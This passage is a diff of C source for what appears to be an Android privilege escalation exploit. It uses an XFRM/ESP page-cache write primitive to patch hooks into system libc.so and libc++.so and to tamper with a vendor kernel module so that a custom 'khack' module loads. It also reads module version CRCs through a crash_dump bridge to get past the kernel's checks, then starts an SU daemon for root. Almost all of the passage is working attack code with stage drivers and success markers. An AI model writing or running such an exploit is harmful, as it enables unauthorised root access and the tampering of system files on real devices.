+    kCrashDump = detect_crash_dump();
+    printf("crash_dump: %s\n", kCrashDump);
+    printf("found ko_target: %s\n", ko_target);
+    printf("encap port: %d\n", encap_port);
+    printf("spi: 0x%x\n", spi);
+    return 0;
+}
+
+
+/* ---- vendor .ko __versions dumper -------------------------------------
+ * Reads the module through the crash_dump bridge (the only domain that may
+ * open vendor_file) in 16-byte blocks and prints every (crc, symbol) pair.
+ * The point is to learn the CRC the running vendor kernel actually expects
+ * for module_layout -- something we cannot compute from the Lineage tree.
+ */
+static int vread(uint64_t off, void *buf, size_t len) {
+    uint8_t *p = (uint8_t *)buf;
+    for (size_t i = 0; i < len; i += 16) {
+        uint8_t blk[16];
+        if (read_vendor_content((off_t)(off + i), blk) < 0) return -1;
+        size_t n = len - i < 16 ? len - i : 16;
+        memcpy(p + i, blk, n);
+    }
+    return 0;
+}
+
+static uint64_t rd64(const uint8_t *p) { uint64_t v; memcpy(&v, p, 8); return v; }
+static uint32_t rd32(const uint8_t *p) { uint32_t v; memcpy(&v, p, 4); return v; }
+static uint16_t rd16(const uint8_t *p) { uint16_t v; memcpy(&v, p, 2); return v; }
+
+static int dump_ko_versions(void) {
+    uint8_t eh[64];
+    if (vread(0, eh, sizeof eh)) { printf("kodump: header read failed\n"); return 1; }
+    if (memcmp(eh, "\x7f""ELF", 4)) { printf("kodump: not an ELF\n"); return 1; }
+
+    uint64_t shoff     = rd64(eh + 0x28);
+    uint16_t shentsize = rd16(eh + 0x3a);
+    uint16_t shnum     = rd16(eh + 0x3c);
+    uint16_t shstrndx  = rd16(eh + 0x3e);
+    printf("kodump: %s shoff=0x%llx n=%u entsize=%u strndx=%u\n",
+           libcxx_ko_target, (unsigned long long)shoff, shnum, shentsize, shstrndx);
+    if (!shnum || shentsize < 64 || shnum > 256) { printf("kodump: bad section table\n"); return 1; }
+
+    size_t shbytes = (size_t)shnum * shentsize;
+    uint8_t *shs = malloc(shbytes);
+    if (!shs) return 1;
+    if (vread(shoff, shs, shbytes)) { printf("kodump: section headers unreadable\n"); free(shs); return 1; }
+
+    /* shstrtab */
+    uint64_t stroff = 0, strsize = 0;
+    if (shstrndx < shnum) {
+        stroff  = rd64(shs + (size_t)shstrndx * shentsize + 24);
+        strsize = rd64(shs + (size_t)shstrndx * shentsize + 32);
+    }
+    char *strs = calloc(1, 65536);
+    if (!strs) { free(shs); return 1; }
+    if (strsize && vread(stroff, strs, strsize > 65535 ? 65535 : (size_t)strsize)) {
+        printf("kodump: shstrtab unreadable\n"); free(strs); free(shs); return 1;
+    }
+
+    for (int i = 0; i < shnum; i++) {
+        uint8_t *sh = shs + (size_t)i * shentsize;
+        uint32_t nameoff = rd32(sh);
+        const char *nm = (nameoff < 65535) ? strs + nameoff : "";
+        if (strcmp(nm, "__versions") && strcmp(nm, ".versions")) continue;
+
+        uint64_t off  = rd64(sh + 24);
+        uint64_t size = rd64(sh + 32);
+        printf("kodump: section %s off=0x%llx size=%llu\n", nm,
+               (unsigned long long)off, (unsigned long long)size);
+        if (size > 8192) size = 8192;
+        uint8_t *v = malloc((size_t)size);
+        if (!v) break;
+        if (vread(off, v, (size_t)size)) { printf("kodump: versions unreadable\n"); free(v); break; }
+        for (size_t e = 0; e + 64 <= size; e += 64) {
+            uint32_t crc = rd32(v + e);
+            char sym[57];
+            memcpy(sym, v + e + 8, 56);   /* u64 crc + name[56] on 64-bit */
+            sym[56] = 0;
+            if (!sym[0]) continue;
+            printf("kodump: 0x%08x %s\n", crc, sym);
+        }
+        free(v);
+        break;
+    }
+    free(strs);
+    free(shs);
+    return 0;
+}
+
+static int exploit(void) {
+    printf("\n=== exploit (patching files) ===\n");
+
+    int rc = 3;
+    /* Snapshot the module target before anything writes to it.  This has to
+     * happen in the parent process: patch_ko() runs in a forked child and its
+     * globals die with it. */
+    if (!g_ko_saved) {
+        save_region(libcxx_ko_target, g_ko_orig, &g_ko_len, &g_ko_saved);
+        printf("saved %zu bytes of %s (ok=%d)\n",
+               g_ko_len, libcxx_ko_target, g_ko_saved);
+    }
+
+    if (patch_helper()) goto done;
+    if (patch_ko()) goto done;
+    if (patch_hook("/system/lib64/libc.so", "__libc_init",
+                   libc2_data, libc2_len, libc2_start, libc2_first_inst_copy,
+                   &g_libc_r)) goto done;
+    if (patch_hook("/system/lib64/libc++.so",
+                   "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                   libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                   &g_libcxx_r)) goto done;
+
+    rc = 2;
+    usleep(500000);
+    
+    printf("\n=== init  ===\n");
+    createOrphanProcess();
+
+    static const struct {
+        const char *path;
+        const char *msg;
+        int         rc;
+    } markers[] = {
+        { "/dev/df",    "libc++: loading custom module",                    -1 },
+        { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
+        { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
+        { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
+        { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
+        { "/dev/dfmw0", "bootstrap: WARNING - clone zygote env failed",     -1 },
+        { "/dev/dfm3",  "bootstrap: setting partitions ro",                 -1 },
+        { "/dev/dfmw1", "bootstrap: WARNING - set partitions ro failed",    -1 },
+        { "/dev/dfm4",  "bootstrap: disabling ksu modules",                 -1 },
+        { "/dev/dfme1", "bootstrap: ERROR - disable modules failed",         1 },
+        { "/dev/dfm5",  "bootstrap: starting SU daemon",                    -1 },
+        { "/dev/dfm6",  "ksud start: SUCCESS",                               0 },
+        { "/dev/dfme2", "ksud start: ERROR - ksud nonzero exit",             1 },
+    };
+    int seen[sizeof(markers)/sizeof(markers[0])] = {0};
+
+    for (int elapsed = 0; elapsed < 10000; elapsed += 10) {
+        usleep(10000);
+        /* real success criterion: the module is loaded and the escalation
+         * node exists, so this process can actually become root */
+        if (access("/dev/khack", F_OK) == 0 || access("/sys/module/khack_dl", F_OK) == 0) {
+            printf("ready: %s (uid=%d)\n",
+                   "/sys/module/khack_dl",
+                   getuid());
+            rc = 0;
+            goto done;
+        }
+        for (size_t j = 0; j < sizeof(markers)/sizeof(markers[0]); j++) {
+            if (!seen[j] && access(markers[j].path, F_OK) == 0) {
+                seen[j] = 1;
+                printf("%s\n", markers[j].msg);
+                if (markers[j].rc >= 0) { rc = markers[j].rc; goto done; }
+            }
+        }
+    }
+    printf("timeout: ERROR - check logcat & dmesg\n");
+done:
+    if (rc == 3) printf("patch: ERROR - failed to patch files\n");
+    return rc;
+}
+
+/* Rewrite 64 bytes of an app-owned scratch file through the XFRM/ESP
+ * page-cache path and read them back. Touches no system binary, so a
+ * kernel without the primitive leaves nothing modified behind. */
+static int probe_primitive(void) {
+    const size_t N = 64;
+    uint8_t desired[64], orig[64], got[64];
+
+    for (size_t i = 0; i < N; i++) desired[i] = (uint8_t)(0xA5 ^ (i * 7));
+    printf("probe: target %s\n", g_probe_file);
+
+    int fd = open(g_probe_file, O_RDONLY);
+    if (fd < 0) { printf("probe: open failed: %s\n", strerror(errno)); return 1; }
+    if (pread(fd, orig, N, 0) != (ssize_t)N) {
+        printf("probe: pread failed: %s\n", strerror(errno)); close(fd); return 1;
+    }
+    close(fd);
+
+    if (patch_file_cbc(g_probe_file, (const char *)desired, N, 0, 0) != 0) {
+        printf("probe: PATCH FAILED\n");
+        return 1;
+    }
+
+    fd = open(g_probe_file, O_RDONLY);
+    if (fd < 0) { printf("probe: reopen failed: %s\n", strerror(errno)); return 1; }
+    ssize_t n = pread(fd, got, N, 0);
+    close(fd);
+    if (n != (ssize_t)N) { printf("probe: readback short (%zd)\n", n); return 1; }
+
+    int match = memcmp(got, desired, N) == 0;
+    printf("probe: readback %s\n", match ? "MATCH" : "MISMATCH");
+    printf("probe: orig %02x%02x%02x%02x  got %02x%02x%02x%02x  want %02x%02x%02x%02x\n",
+           orig[0], orig[1], orig[2], orig[3],
+           got[0], got[1], got[2], got[3],
+           desired[0], desired[1], desired[2], desired[3]);
+    printf("probe: %s\n", match ? "PRIMITIVE_OK" : "PRIMITIVE_ABSENT");
+    return match ? 0 : 1;
+}
+
+
+/* ---- detailed file log in the app's private dir ---- */
+static FILE *g_log;
+
+static void log_init(void)
+{
+	g_log = fopen("/data/data/com.system.testsu/files/exp.log", "a");
+	if (g_log) {
+		time_t t = time(NULL);
+		fprintf(g_log, "\n===== run %s", ctime(&t));
+		fflush(g_log);
+	}
+}
+
+static int xprintf(const char *fmt, ...)
+{
+	va_list ap;
+	int r;
+
+	va_start(ap, fmt);
+	r = vprintf(fmt, ap);
+	va_end(ap);
+
+	if (g_log) {
+		va_start(ap, fmt);
+		vfprintf(g_log, fmt, ap);
+		va_end(ap);
+		fflush(g_log);
+	}
+	return r;
+}
+
+#define printf xprintf
+
+int main(
+int argc, char **argv) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (setup(argc, argv) != 0) return 2;
+    if (g_kodump) {
+        printf("kodump: %s\n", libcxx_ko_target);
+        if (patch_helper()) { printf("kodump: helper patch failed\n"); return 1; }
+        return dump_ko_versions();
+    }
+    if (g_probe_file) return probe_primitive();
+    if (g_stage1) {
+        int rc1 = patch_helper();
+        printf("stage1: %s\n", rc1 == 0 ? "HELPER_PATCHED" : "HELPER_PATCH_FAILED");
+        return rc1;
+    }
+    if (g_bridge_read) {
+        uint8_t buf[16] = {0};
+        printf("bridge: reading %s+0x0 via crash_dump\n", libcxx_ko_target);
+        int br = read_vendor_content(0, buf);
+        if (br == 0) {
+            printf("bridge: bytes");
+            for (int i = 0; i < 16; i++) printf(" %02x", buf[i]);
+            printf("\nbridge: BRIDGE_OK\n");
+            return 0;
+        }
+        printf("bridge: BRIDGE_FAIL\n");
+        return 1;
+    }
+    if (g_init_hook) {
+        printf("init: patching libc++.so hook\n");
+        if (patch_hook("/system/lib64/libc++.so",
+                       "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
+                       libcxx_data, libcxx_len, libcxx_start, libcxx_first_inst_copy,
+                       &g_libcxx_r)) {
+            printf("init: HOOK_PATCH_FAILED\n");
+            return 1;
+        }
+        createOrphanProcess();
+        for (int i = 0; i < 80; i++) {
+            if (access("/dev/df", F_OK) == 0) {
+                printf("init: INIT_HOOK_OK\n");
+                return 0;
+            }
+            usleep(100000);
+        }
+        printf("init: INIT_HOOK_TIMEOUT\n");
+        return 1;
+    }
+    int rc = exploit();
+    cleanup();
+    return rc;
+}
